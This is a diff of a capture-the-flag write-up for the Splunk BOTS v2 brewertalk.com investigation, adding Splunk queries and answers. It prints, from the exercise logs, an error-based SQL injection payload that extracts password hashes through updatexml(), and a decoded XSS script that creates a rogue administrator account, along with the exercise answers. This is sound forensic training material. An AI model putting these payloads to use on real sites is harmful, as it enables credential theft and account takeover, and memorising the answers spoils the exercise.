@@ -292,12 +292,10 @@ Trying KEYWORD 'install' shows "C:\Users\amber.turing\Downloads\torbrowser-insta
 
 Determine:
 
-- The public IP address of brewertalk.com
-- The IP address performing a web vulnerability scan against it
+**Q2 The public IP address of brewertalk.com**
 
 Use the techniques from previous searches.
 
-Try
 ```
 index="botsv2" "brewertalk.com"
 ```
@@ -340,6 +338,9 @@ Leads to IP for www.brewertalk.com, src_ip: 52.40.10.231:
    src_port: 57245
    status: 200 
 ```
+
+**Q3 The IP address performing a web vulnerability scan against it**
+
 The Scr_IP most likely performing a vulnerability assessment on www.brewertalk.com
 ```
 index="botsv2" "www.brewertalk.com" sourcetype="stream:http"
@@ -365,6 +366,8 @@ index="botsv2" source="stream:http" "www.brewertalk.com"
 ```
 
 ### Questions 4 & 5: Attack URI and SQL Function
+
+**Q4 What URI path was attacked from the IP address in Question 3? (Include the leading /.)**
 
 Using the attacker IP from Question 3:
 ```
@@ -393,10 +396,11 @@ uri_path       count
 /	          47
 /admin/	     6
 ```
+################
 
+**Q5 What SQL function was abused on that URI path?**
 
 Review the results to determine the SQL function being abused.
-
 ```
 8/16/17
 3:25:19.017 PM	
@@ -430,13 +434,16 @@ Review the results to determine the SQL function being abused.
    uri_path: /member.php
 } 
 ```
-taking a closer look at the data field contains:
+From here we try search with /member.php and look SQL, can also add keyword SELECT to search parameters, that shortens list to 68 from 598 events.
+```
+index="botsv2" source="stream:http" src_ip="45.77.65.211" uri_path="/member.php" SELECT
+```
+
+Taking a closer look at the form_data field (many show same form_data field content) contains:
 ```
 regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1
 ```
 That payload is an error-based SQL injection attack.
-
-The key indicator is:
 ```
 updatexml(
 NULL,
@@ -453,98 +460,78 @@ Why it's error-based SQLi
 
 UPDATEXML() is a MySQL XML function. When given malformed XML/XPath arguments, it intentionally generates a database error. Attackers abuse this because the error message can contain the result of a query.
 
-Example:
 
-```
-UPDATEXML(NULL, CONCAT(':', database()), NULL)
-```
+### Questions 6 & 7: XSS Cookie and Spear-Phishing User
 
-Might produce an error similar to:
-
-```
-XPATH syntax error: ':mydatabase'
-``
-The attacker then reads the data from the error message.
-
-### What this payload is doing
-
-The injected sql string:
-
-```
-' and updatexml(...)
-and '1
-```
-
-Attempts to append a condition to the original query.
-
-Inside the UPDATEXML() call:
-
-```
-SELECT password
-FROM mybb_users
-ORDER BY UID
-LIMIT 5,1
-```
-
-retrieves the password hash from the 6th user record (offset 5).
-
-Then:
-
-```
-SUBSTRING(..., 32, 31)
-```
-
-extracts part of that hash.
-
-Then:
-
-```
-CONCAT(0x3a, ...)
-```
-
-Adds a colon (:) before the extracted data.
-
-Finally, UPDATEXML() causes an error containing that value, allowing the attacker to exfiltrate the password hash through the application's error output.
-
-
-
-Questions 6 & 7: XSS Cookie and Spear-Phishing User
+**Q6 What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of an XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign. The key indicator is:**
 
 Start by gathering information about Kevin.
+```
+index="botsv2" source="stream:http" kevin
+```
+Only 3 events are found , the value of the cookie found was:
+```
+   cookie: mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228
+```
 
-Command
+```
+8/16/17 3:19:16.770 PM	
+{ [-]
+   bytes: 4771
+   bytes_in: 2879
+   bytes_out: 1892
+   cookie: mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228
+   dest_ip: 172.31.4.249
+   dest_mac: 0A:42:7E:25:21:B4
+   dest_port: 80
+   endtime: 2017-08-16T15:19:16.770877Z
+   flow_id: bd17b887-e15a-42ec-a00e-632a8222a26e
+   form_data: username=kevin&password=8675309&do=login
+   http_comment: HTTP/1.1 302 Found
+   http_content_length: 0
+   http_content_type: text/html; charset=UTF-8
+   http_method: POST
+   http_referrer: http://www.brewertalk.com/admin/index.php?module=user-titles&action=edit&utid=2%22%3E%3Cscript%3E%0Awindow.onload%3Dfunction(e)%7B%0A%20%20var%20my_post_key%20%3D%20document.getElementsByName(%22my_post_key%22)%5B0%5D.value%0A%20%20console.log(my_post_key)%3B%0A%20%20var%20postdata%3D%20%22my_post_key%3D%22%2Bmy_post_key%2B%22%26username%3DkIagerfield%26password%3Dbeer_lulz%26confirm_password%3Dbeer_lulz%26email%3DkIagerfield%40froth.ly%26usergroup%3D4%26additionalgroups%5B%5D%3D4%26displaygroup%3D4%22%3B%2F%2FPost%20the%20Data%0A%20%20var%20url%20%3D%20%22http%3A%2F%2Fwww.brewertalk.com%2Fadmin%2Findex.php%3Fmodule%3Duser-users%26action%3Dadd%22%3B%0A%20%20var%20http%3B%0A%20%20http%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20http.open(%22Post%22%2Curl)%3B%0A%0A%20%20http.setRequestHeader(%27Accept%27%2C%27text%2Fhtml%27)%3B%0A%20%20http.setRequestHeader(%27Content-type%27%2C%27application%2Fx-www-form-urlencoded%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxhtml%2Bxml%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxml%27)%3B%0A%20%20http.send(postdata)%3B%0A%20%20console.log(my_post_key)%3B%0A%7D%0A%3C%2Fscript%3E
+  
 
-Plain Text
-spl isn’t fully supported. Syntax highlighting is based on Plain Text.
-index="botsv2" kevin
-Show more lines
+**Q7 Once you find the relevant events, determine the username created through a spear-phishing attack?**
 
-Identify Kevin's full name, then investigate the XSS attack.
+Two ways to get it one is using the hint:
 
-Focus on:
+- Hint: This is the hint you’re looking for: The attacker stole Kevin's CSRF token (1bc3eab741900ab25c98eee86bf20feb) and performed a trick from domain squatters by using a homograph attack. Thats a simple letter substitution such as between Latin and Cyrillic.
+- The other is that its found in the results from previous question below the cookie.
 
-Kevin's HTTP traffic
-XSS payloads
-Cookie values sent to a malicious URL
+Using the hint first using keyword search:
+```
+index="botsv2"  kevin 1bc3eab741900ab25c98eee86bf20feb
+```
 
-Once you find the relevant events, determine the username created through a spear-phishing attack.
+Answer is found in 6 events, repeatedly in several fields percentage encoded and unencoded depending on field:
+- form_data:
+- dest_content: 
+- http_referrer:
+- src_headers:
+- uri_query:
 
-A keyword search should help:
-
-Command
-
-Plain Text
-spl isn’t fully supported. Syntax highlighting is based on Plain Text.
-index="botsv2" KEYWORD
-Show more lines
-
-Replace KEYWORD with an appropriate search term.
-
-Questions to Answer
-What version of TOR Browser did Amber install to obfuscate her web browsing?
-What is the public IPv4 address of the server running www.brewertalk.com?
-What IP address performed a web vulnerability scan against www.brewertalk.com?
-What URI path was attacked from the IP address in Question 3? (Include the leading /.)
-What SQL function was abused on that URI path?
-What cookie value did Kevin's browser transmit during the XSS attack? (Digits only.)
-What brewertalk.com username was maliciously created through a spear-phishing attack?
+Easiest way was found in the 3 events found in Q6, These 3 packets also include Username kIagerfield. Here is the encoded section at end without the percentage encoding:
+```
+http://www.brewertalk.com/admin/index.php?module=user-titles&action=edit&utid=2">
+<script>
+window.onload=function(e){
+var my_post_key = document.getElementsByName("my_post_key")[0].value
+console.log(my_post_key);
+var postdata= "my_post_key="+my_post_key+"&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4";//Post the Data
+var url = "http://www.brewertalk.com/admin/index.php?module=user-users&action=add";
+var http;
+http = new XMLHttpRequest();
+http.open("Post",url);
+ 
+http.setRequestHeader('Accept','text/html');
+http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+http.setRequestHeader('Accept','application/xhtml+xml');
+http.setRequestHeader('Accept','application/xml');
+http.send(postdata);
+console.log(my_post_key);
+}
+</script>
+```
